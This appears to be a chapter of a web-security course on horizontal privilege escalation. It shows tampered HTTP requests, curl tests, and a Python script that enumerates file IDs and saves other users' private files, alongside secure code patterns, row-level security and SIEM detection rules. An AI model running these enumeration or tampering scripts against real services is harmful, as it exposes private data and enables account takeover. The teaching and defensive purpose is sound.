# 02 — Horizontal Privilege Escalation

## Overview

**Horizontal privilege escalation** occurs when a user gains access to resources or functionality belonging to **another user at the same privilege level**. Unlike vertical escalation (user → admin), horizontal escalation stays within the same role but crosses user boundaries. This is one of the most prevalent access-control weaknesses, affecting virtually every application that manages user-specific data. It maps to **OWASP A01:2021 – Broken Access Control** and **CWE-639: Authorization Bypass Through User-Controlled Key**.

---

## 1. Horizontal vs Vertical Privilege Escalation

```
+──────────────────────────────────────────────────────────────+
│           Privilege Escalation Comparison                    │
+──────────────────────────────────────────────────────────────+
│                                                              │
│   VERTICAL ESCALATION          HORIZONTAL ESCALATION         │
│                                                              │
│   ┌──────────┐                 ┌──────────┐ ┌──────────┐    │
│   │  Admin   │ ◄── attacker    │  User A  │ │  User B  │    │
│   └──────────┘     escalates   └──────────┘ └──────────┘    │
│        ▲           upward           │             ▲          │
│        │                            │             │          │
│   ┌──────────┐                      └─────────────┘          │
│   │   User   │                     attacker crosses          │
│   └──────────┘                     to peer account           │
│                                                              │
│   Different privilege level    Same privilege level           │
│   User → Admin                User A → User B's data         │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

| Aspect | Horizontal | Vertical |
|---|---|---|
| **Direction** | Same level, different user | Lower → higher privilege |
| **Attacker role** | Regular user | Regular user |
| **Target** | Another regular user's data/actions | Admin functions/data |
| **Impact** | PII exposure, data manipulation | Full system compromise |
| **Detection** | Harder (legitimate role, wrong user) | Easier (role mismatch) |
| **CWE** | CWE-639 | CWE-269 |
| **Frequency** | Very common | Common |

---

## 2. Attack Vectors

### 2.1 Parameter Tampering

The most classic horizontal escalation vector.

```http
# Legitimate request by User A (id=1001)
GET /api/account/1001/settings HTTP/1.1
Cookie: session=USER_A_SESSION

# Attacker changes the parameter
GET /api/account/1002/settings HTTP/1.1
Cookie: session=USER_A_SESSION

# If the server doesn't verify ownership → User B's settings returned
```

**Common Tamperable Parameters:**

| Parameter | Location | Example |
|---|---|---|
| `user_id` | URL query string | `?user_id=1002` |
| `account_id` | URL path segment | `/accounts/1002/` |
| `email` | POST body | `{"email":"victim@corp.com"}` |
| `order_id` | URL query string | `?order_id=5500` |
| `ref` | Hidden field | `<input type="hidden" name="ref" value="1002">` |

### 2.2 Cookie & Session Manipulation

```
+──────────────────────────────────────────────────────────+
│            Cookie-Based Horizontal Escalation            │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Scenario: Application stores user_id in a cookie       │
│  rather than deriving it from the session server-side    │
│                                                          │
│  Original cookies:                                       │
│    session=abc123; user_id=1001; role=user               │
│                                                          │
│  Attack:                                                 │
│    session=abc123; user_id=1002; role=user               │
│                       ▲                                  │
│                  changed to victim's ID                  │
│                                                          │
│  If the server trusts the cookie value without           │
│  cross-referencing the session → horizontal escalation   │
│                                                          │
│  Variations:                                             │
│  • user_id in JWT payload (unsigned/weak signature)      │
│  • user_id in localStorage read by client-side JS       │
│  • user_id in custom HTTP header                        │
│                                                          │
+──────────────────────────────────────────────────────────+
```

**Testing Cookie Manipulation:**

```bash
# Original request
curl -s -b "session=abc123; uid=1001" https://target.com/dashboard

# Tampered request
curl -s -b "session=abc123; uid=1002" https://target.com/dashboard

# Compare outputs
diff <(curl -s -b "session=abc123; uid=1001" https://target.com/dashboard) \
     <(curl -s -b "session=abc123; uid=1002" https://target.com/dashboard)
```

### 2.3 Token / Session ID Prediction

```
+──────────────────────────────────────────────────────────+
│         Session Prediction Attack Flow                   │
+──────────────────────────────────────────────────────────+
│                                                          │
│  If session tokens are predictable:                      │
│                                                          │
│  User A: session = user_1001_20240115_001                │
│  User B: session = user_1002_20240115_002   ← predict   │
│  User C: session = user_1003_20240115_003   ← predict   │
│                                                          │
│  Pattern: user_{uid}_{date}_{seq}                        │
│                                                          │
│  Attack: Generate predicted session tokens               │
│  and impersonate other users.                            │
│                                                          │
│  Tools: Burp Sequencer (entropy analysis)                │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 2.4 Email / Username as Identifier

```http
# Password reset using email as the object reference
POST /api/password/reset HTTP/1.1
Content-Type: application/json
Authorization: Bearer USER_A_TOKEN

{
  "email": "victim@example.com",
  "new_password": "hacked123!"
}

# If the API trusts the email in the body rather than
# deriving it from the authenticated session →
# attacker resets victim's password
```

### 2.5 Predictable Resource URLs

```
# User A uploads avatar → stored at:
https://cdn.example.com/avatars/user_1001_avatar.jpg

# Predictable pattern allows accessing any user's avatar:
https://cdn.example.com/avatars/user_1002_avatar.jpg

# Or private documents:
https://cdn.example.com/docs/user_1001/tax_return_2024.pdf
https://cdn.example.com/docs/user_1002/tax_return_2024.pdf
```

---

## 3. Multi-Step Process Exploitation

Many applications validate access at the first step but not subsequent steps.

### 3.1 Attack Pattern

```
+──────────────────────────────────────────────────────────────+
│         Multi-Step Horizontal Escalation                     │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  Normal Flow (User A):                                       │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐      │
│  │ Step 1:     │───►│ Step 2:     │───►│ Step 3:     │      │
│  │ View Orders │    │ Select Order│    │ View Detail │      │
│  │ (list own)  │    │ order=5001  │    │ Download    │      │
│  └─────────────┘    └─────────────┘    └─────────────┘      │
│  Auth: ✓ checked    Auth: ✓ checked   Auth: ✗ NOT checked   │
│                                                              │
│  Attack: Skip to Step 3 directly with another user's        │
│  order ID:                                                   │
│                                                              │
│  GET /orders/download?order_id=5002    ← User B's order     │
│  Cookie: session=USER_A_SESSION                              │
│                                                              │
│  Result: User A downloads User B's order invoice             │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 3.2 Common Multi-Step Targets

| Process | Vulnerable Step | Impact |
|---|---|---|
| Profile update | Step 2: save changes (no re-validation) | Modify another user's profile |
| Order management | Final download/receipt step | Access another user's invoices |
| Password change | Confirmation step references email/uid | Change another user's password |
| Support tickets | View ticket detail | Read another user's communications |
| File sharing | Direct download link | Access private shared files |

---

## 4. Testing Methodology

### 4.1 Comprehensive Test Plan

```
+──────────────────────────────────────────────────────────────+
│       Horizontal Privilege Escalation Test Plan              │
+──────────────────────────────────────────────────────────────+
│                                                              │
│  PREPARATION                                                 │
│  ├── Create Account A (attacker-controlled)                  │
│  ├── Create Account B (victim simulation)                    │
│  ├── Record all object IDs for both accounts:                │
│  │    • user_id, profile_id, order_ids, document_ids         │
│  │    • session tokens, API keys                             │
│  └── Map all endpoints that handle user-specific data        │
│                                                              │
│  TESTING PHASES                                              │
│                                                              │
│  Phase 1: Parameter Swap                                     │
│  ├── For each endpoint containing a user-specific ID:        │
│  │    • Use Account A's session                              │
│  │    • Replace A's ID with B's ID                           │
│  │    • Check response: data returned? action performed?     │
│  └── Test across all HTTP methods                            │
│                                                              │
│  Phase 2: Cookie / Token Manipulation                        │
│  ├── Identify all cookies referencing user identity          │
│  ├── Swap cookie values while keeping session valid          │
│  └── Test JWT claims modification if applicable              │
│                                                              │
│  Phase 3: Multi-Step Processes                               │
│  ├── Complete each multi-step flow normally first            │
│  ├── Replay later steps with modified references             │
│  └── Test direct access to final-step URLs                   │
│                                                              │
│  Phase 4: Resource URL Guessing                              │
│  ├── Analyze URL patterns for uploaded files                 │
│  ├── Predict URLs for other users' resources                 │
│  └── Test with unauthenticated requests too                  │
│                                                              │
│  Phase 5: Automated Scanning                                 │
│  ├── Configure Autorize with Account B's credentials         │
│  ├── Browse as Account A                                     │
│  └── Review Autorize results for authorization failures      │
│                                                              │
+──────────────────────────────────────────────────────────────+
```

### 4.2 Burp Suite Workflow

**Using Burp Comparer to detect horizontal escalation:**

```
Step 1: As User A → GET /api/profile/1001 → Save response as "A_own"
Step 2: As User A → GET /api/profile/1002 → Save response as "A_accessing_B"
Step 3: As User B → GET /api/profile/1002 → Save response as "B_own"

Compare:
  "A_accessing_B" vs "B_own"
  
  If they match → HORIZONTAL PRIVILEGE ESCALATION CONFIRMED
  If "A_accessing_B" returns 403/401 → Access control working
```

**Using Burp Match & Replace for systematic testing:**

```
# In Burp → Proxy → Options → Match and Replace:

Type: Request header
Match: Cookie: session=USER_A_SESSION
Replace: Cookie: session=USER_B_SESSION

# Now browse as User A while Burp automatically replays
# every request with User B's session
```

### 4.3 Autorize for Horizontal Testing

```
+──────────────────────────────────────────────────────────+
│          Autorize — Horizontal Testing Setup             │
+──────────────────────────────────────────────────────────+
│                                                          │
│  1. Configure Autorize:                                  │
│     • Paste User B's session cookie                      │
│     • Set enforcement patterns:                          │
│       - "403" / "401" / "Forbidden" / "Unauthorized"     │
│                                                          │
│  2. Browse as User A:                                    │
│     • Visit profile page                                 │
│     • View orders                                        │
│     • Download documents                                 │
│     • Update settings                                    │
│                                                          │
│  3. Autorize replays each request with User B's token:   │
│                                                          │
│  ┌───────────────────────────────────────────────────┐   │
│  │ URL                  │ Original │ Replayed │ Stat │   │
│  ├──────────────────────┼──────────┼──────────┼──────┤   │
│  │ /api/profile/1001    │ 200      │ 200      │ FAIL │   │
│  │ /api/orders/5001     │ 200      │ 200      │ FAIL │   │
│  │ /api/settings        │ 200      │ 200      │ FAIL │   │
│  │ /api/billing         │ 200      │ 403      │ PASS │   │
│  └───────────────────────────────────────────────────┘   │
│                                                          │
│  FAIL = User B can access User A's resources             │
│         (horizontal escalation confirmed!)               │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 4.4 Automated Testing with Python

```python
import requests

# Configuration
BASE_URL = "https://target.com/api"
USER_A_TOKEN = "Bearer eyJ...userA..."
USER_B_TOKEN = "Bearer eyJ...userB..."

# Endpoints with user-specific data
ENDPOINTS = [
    "/profile/{uid}",
    "/orders/{uid}",
    "/settings/{uid}",
    "/documents/{uid}",
    "/billing/{uid}",
    "/notifications/{uid}",
]

USER_A_ID = "1001"
USER_B_ID = "1002"

print("=" * 60)
print("Horizontal Privilege Escalation Test")
print("=" * 60)

for endpoint in ENDPOINTS:
    # User A accessing their own resource (baseline)
    url_own = BASE_URL + endpoint.format(uid=USER_A_ID)
    r_own = requests.get(url_own, headers={"Authorization": USER_A_TOKEN})
    
    # User A accessing User B's resource (attack)
    url_other = BASE_URL + endpoint.format(uid=USER_B_ID)
    r_other = requests.get(url_other, headers={"Authorization": USER_A_TOKEN})
    
    status = "VULNERABLE" if r_other.status_code == 200 else "SECURE"
    color = "!!!" if status == "VULNERABLE" else "   "
    
    print(f"{color} {endpoint:<35} Own={r_own.status_code} "
          f"Other={r_other.status_code} → {status}")
```

---

## 5. Specific Exploitation Scenarios

### 5.1 Account Takeover via Password Reset

```
+──────────────────────────────────────────────────────────+
│        Account Takeover via Horizontal Escalation        │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Vulnerable password change endpoint:                    │
│                                                          │
│  POST /api/change-password HTTP/1.1                      │
│  Authorization: Bearer USER_A_TOKEN                      │
│  Content-Type: application/json                          │
│                                                          │
│  {                                                       │
│    "user_id": 1002,          ← victim's ID               │
│    "new_password": "pwned!"                              │
│  }                                                       │
│                                                          │
│  Server processes:                                       │
│    1. ✓ Checks: is user authenticated? YES               │
│    2. ✗ Does NOT check: does token match user_id 1002?   │
│    3. Changes user 1002's password to "pwned!"           │
│                                                          │
│  Result: Attacker now logs in as victim                  │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 5.2 Financial Data Exposure

```http
# Attacker's legitimate request
GET /api/banking/accounts/ACC-1001/transactions HTTP/1.1
Authorization: Bearer USER_A_TOKEN

# Response: User A's transactions (expected)

# Attack: Change account number
GET /api/banking/accounts/ACC-1002/transactions HTTP/1.1
Authorization: Bearer USER_A_TOKEN

# Response: User B's transactions including:
# - Transaction amounts
# - Account balances
# - Recipient details
# - Transaction dates
```

### 5.3 Private Message / Email Access

```http
# User A's inbox
GET /api/messages?user=alice@example.com HTTP/1.1
Cookie: session=USER_A_SESSION

# Attack: Access Bob's inbox
GET /api/messages?user=bob@example.com HTTP/1.1
Cookie: session=USER_A_SESSION

# If successful → read all of Bob's private messages
```

### 5.4 File Upload / Download Access

```python
# Exploit: Download other users' private files
import requests

BASE = "https://target.com/api/files"
HEADERS = {"Authorization": "Bearer ATTACKER_TOKEN"}

# Enumerate file IDs
for file_id in range(1, 1000):
    r = requests.get(f"{BASE}/{file_id}/download", headers=HEADERS)
    if r.status_code == 200:
        content_disp = r.headers.get('Content-Disposition', '')
        print(f"[VULN] File {file_id}: {content_disp} "
              f"({len(r.content)} bytes)")
        # Save the file
        with open(f"exfil/file_{file_id}", 'wb') as f:
            f.write(r.content)
```

---

## 6. GraphQL-Specific Horizontal Escalation

```graphql
# Legitimate query — User A views own profile
query {
  me {
    id
    email
    orders {
      id
      total
    }
  }
}

# Attack — Query another user directly
query {
  user(id: "1002") {
    email
    phone
    ssn
    orders {
      id
      total
      items {
        name
        price
      }
    }
    paymentMethods {
      cardNumber
      expiry
    }
  }
}
```

**GraphQL Introspection to find exploitable fields:**

```graphql
# Discover all queryable types and fields
{
  __schema {
    queryType {
      fields {
        name
        args {
          name
          type { name }
        }
      }
    }
  }
}
```

**GraphQL-Specific Defenses:**

| Control | Implementation |
|---|---|
| Disable introspection in production | `introspection: false` in server config |
| Field-level authorization | Check ownership per resolver |
| Query depth limiting | Prevent nested data harvesting |
| Cost analysis | Limit query complexity |

---

## 7. API-Specific Horizontal Escalation

### 7.1 REST API Patterns

```
+──────────────────────────────────────────────────────────+
│         REST API Horizontal Escalation Patterns          │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Pattern 1: Direct ID in path                            │
│  GET /api/v1/users/1002/profile                          │
│                    ^^^^                                   │
│                                                          │
│  Pattern 2: ID in query parameter                        │
│  GET /api/v1/profile?uid=1002                            │
│                          ^^^^                            │
│                                                          │
│  Pattern 3: ID in request body                           │
│  POST /api/v1/update  {"user_id": 1002, ...}             │
│                                   ^^^^                   │
│                                                          │
│  Pattern 4: ID in custom header                          │
│  GET /api/v1/dashboard                                   │
│  X-User-Id: 1002                                         │
│             ^^^^                                         │
│                                                          │
│  Pattern 5: Nested resource IDs                          │
│  GET /api/v1/users/1001/orders/5002/items                │
│                    ^^^^        ^^^^                      │
│        user validated?    order validated?                │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 7.2 Nested Resource Exploitation

```http
# Scenario: Application validates user_id but not order_id

# This is blocked (wrong user):
GET /api/users/1002/orders/5002 HTTP/1.1
Authorization: Bearer USER_A_TOKEN
→ 403 Forbidden ✓

# But this works (your user_id + their order_id):
GET /api/users/1001/orders/5002 HTTP/1.1
Authorization: Bearer USER_A_TOKEN
→ 200 OK ✗  (returns User B's order!)

# Server checked: does token match user 1001? YES
# Server did NOT check: does user 1001 own order 5002? NO
```

---

## 8. Prevention & Remediation

### 8.1 Core Principle: Server-Side Ownership Verification

```
+──────────────────────────────────────────────────────────+
│        Authorization Check Architecture                  │
+──────────────────────────────────────────────────────────+
│                                                          │
│                    ┌────────────┐                        │
│   Request ──────► │ AuthN      │  Is user logged in?     │
│                    │ Middleware │  (Authentication)       │
│                    └─────┬──────┘                        │
│                          │                               │
│                    ┌─────▼──────┐                        │
│                    │ AuthZ      │  Does this user own     │
│                    │ Middleware │  the requested resource? │
│                    └─────┬──────┘  (Authorization)       │
│                          │                               │
│                    ┌─────▼──────┐                        │
│                    │ Business   │  Process the request    │
│                    │ Logic      │                        │
│                    └────────────┘                        │
│                                                          │
│   CRITICAL: AuthZ must derive user identity from the     │
│   authenticated session — NEVER from request params!     │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 8.2 Secure Code Patterns

**Python (Flask):**

```python
# VULNERABLE
@app.route('/api/profile/<int:user_id>')
@login_required
def get_profile(user_id):
    user = User.query.get(user_id)    # Fetches ANY user
    return jsonify(user.to_dict())

# SECURE — derive user from session
@app.route('/api/profile')
@login_required
def get_profile():
    # No user_id parameter — uses authenticated session
    return jsonify(current_user.to_dict())

# SECURE — validate ownership when ID is needed
@app.route('/api/orders/<int:order_id>')
@login_required
def get_order(order_id):
    order = Order.query.filter_by(
        id=order_id,
        user_id=current_user.id    # ← ownership check
    ).first_or_404()
    return jsonify(order.to_dict())
```

**Node.js (Express):**

```javascript
// VULNERABLE
app.get('/api/profile/:userId', auth, async (req, res) => {
  const user = await User.findById(req.params.userId);
  res.json(user);
});

// SECURE — use session identity
app.get('/api/profile', auth, async (req, res) => {
  const user = await User.findById(req.user.id);  // from JWT/session
  res.json(user);
});

// SECURE — ownership middleware
const ownsResource = (Model, paramName = 'id') => {
  return async (req, res, next) => {
    const resource = await Model.findById(req.params[paramName]);
    if (!resource) return res.status(404).json({ error: 'Not found' });
    if (resource.userId.toString() !== req.user.id.toString()) {
      return res.status(403).json({ error: 'Forbidden' });
    }
    req.resource = resource;
    next();
  };
};

app.get('/api/orders/:id', auth, ownsResource(Order), (req, res) => {
  res.json(req.resource);
});
```

**Java (Spring Boot):**

```java
// SECURE — Spring Security method-level authorization
@PreAuthorize("@authService.isOwner(authentication, #orderId)")
@GetMapping("/api/orders/{orderId}")
public ResponseEntity<Order> getOrder(@PathVariable Long orderId) {
    Order order = orderService.findById(orderId);
    return ResponseEntity.ok(order);
}

@Service
public class AuthService {
    public boolean isOwner(Authentication auth, Long orderId) {
        User user = (User) auth.getPrincipal();
        Order order = orderRepository.findById(orderId).orElse(null);
        return order != null && order.getUserId().equals(user.getId());
    }
}
```

### 8.3 Database-Level Enforcement

```sql
-- Always include user_id in queries (Row-Level Security)

-- PostgreSQL Row-Level Security (RLS)
ALTER TABLE orders ENABLE ROW LEVEL SECURITY;

CREATE POLICY user_orders_policy ON orders
  FOR ALL
  USING (user_id = current_setting('app.current_user_id')::INTEGER);

-- Every query is automatically filtered:
-- SELECT * FROM orders WHERE id = 5002;
-- becomes:
-- SELECT * FROM orders WHERE id = 5002 AND user_id = <current_user>;
```

### 8.4 Prevention Summary

| Control | Description | Effectiveness |
|---|---|---|
| **Derive identity from session** | Never accept user ID from client for ownership | ★★★★★ |
| **Ownership middleware** | Centralized check: does user own resource? | ★★★★★ |
| **Row-Level Security (DB)** | Database enforces access boundaries | ★★★★★ |
| **Indirect references** | Map random tokens to real IDs per session | ★★★★☆ |
| **Unpredictable identifiers** | UUIDs instead of sequential integers | ★★★☆☆ |
| **Rate limiting** | Slow down enumeration attacks | ★★☆☆☆ |
| **Audit logging** | Detect anomalous cross-user access patterns | ★★★☆☆ |
| **Automated auth testing** | CI/CD pipeline authorization tests | ★★★★☆ |

---

## 9. Detection & Monitoring

### 9.1 Log Analysis Patterns

```
+──────────────────────────────────────────────────────────+
│         Detecting Horizontal Escalation in Logs          │
+──────────────────────────────────────────────────────────+
│                                                          │
│  Suspicious Pattern: User accessing many different       │
│  user IDs in quick succession                            │
│                                                          │
│  Log entries:                                            │
│  [10:01:01] user=1001 GET /api/profile/1001 → 200       │
│  [10:01:02] user=1001 GET /api/profile/1002 → 200  ◄─┐  │
│  [10:01:02] user=1001 GET /api/profile/1003 → 200    │  │
│  [10:01:03] user=1001 GET /api/profile/1004 → 200    │  │
│  [10:01:03] user=1001 GET /api/profile/1005 → 200  Enum │
│  [10:01:04] user=1001 GET /api/profile/1006 → 200    │  │
│  [10:01:04] user=1001 GET /api/profile/1007 → 200  ◄─┘  │
│                                                          │
│  Alert trigger:                                          │
│  • Same user accessing >5 different user profiles/min   │
│  • Accessing resource IDs not associated with session   │
│  • Sequential ID pattern in requests                    │
│                                                          │
+──────────────────────────────────────────────────────────+
```

### 9.2 SIEM Rules

```yaml
# Splunk query for horizontal escalation detection
index=webserver sourcetype=access_combined
| rex field=uri_path "/api/(?:profile|orders|settings)/(?<target_id>\d+)"
| eval is_cross_user = if(authenticated_user_id != target_id, 1, 0)
| stats count as cross_user_count by authenticated_user_id, src_ip
| where cross_user_count > 10
| sort -cross_user_count
```

```yaml
# ELK / Elasticsearch alert
{
  "trigger": {
    "schedule": { "interval": "5m" }
  },
  "condition": {
    "script": {
      "source": "ctx.payload.hits.total.value > 10"
    }
  },
  "input": {
    "search": {
      "request": {
        "body": {
          "query": {
            "bool": {
              "must": [
                { "range": { "@timestamp": { "gte": "now-5m" }}},
                { "term": { "cross_user_access": true }}
              ]
            }
          },
          "aggs": {
            "by_user": {
              "terms": { "field": "user_id" },
              "aggs": {
                "unique_targets": {
                  "cardinality": { "field": "target_user_id" }
                }
              }
            }
          }
        }
      }
    }
  }
}
```

---

## Summary Table

| Topic | Key Point |
|---|---|
| **Definition** | User accesses another user's data at the same privilege level |
| **Primary Vector** | Parameter tampering (user_id, account_id, order_id) |
| **vs Vertical** | Horizontal = same role, different user; Vertical = role escalation |
| **Cookie Manipulation** | Changing user identifiers stored in cookies |
| **Multi-Step Flaws** | Later steps may not re-validate ownership |
| **API Risks** | Nested resource IDs, GraphQL queries, direct object access |
| **Key Tool** | Burp Autorize — replays requests with alternate session |
| **Primary Fix** | Derive user identity from server-side session, never from client |
| **DB Enforcement** | Row-Level Security ensures queries are user-scoped |
| **Detection** | Monitor for cross-user access patterns in logs/SIEM |

---

## Revision Questions

1. **Explain the difference between horizontal and vertical privilege escalation with a concrete scenario for each. Why is horizontal escalation often harder to detect?**

2. **An application stores `user_id` in a cookie alongside the session token. Describe how you would test this for horizontal escalation and what the remediation should be.**

3. **A REST API endpoint `GET /api/users/{uid}/orders/{orderId}` validates that the `uid` matches the authenticated user but does not verify the `orderId` belongs to that user. How would you exploit this and what is the fix?**

4. **Describe how you would configure Burp Autorize to systematically test for horizontal privilege escalation across all endpoints of a web application.**

5. **Write a PostgreSQL Row-Level Security policy that prevents horizontal escalation at the database level for an `orders` table. Explain how it works.**

6. **Design a SIEM detection rule that would alert on potential horizontal privilege escalation attempts. What log fields would you need and what thresholds would you set?**

---

*Previous: [01-idor.md](01-idor.md) | Next: [03-vertical-privilege-escalation.md](03-vertical-privilege-escalation.md)*

---

*[Back to README](../README.md)*
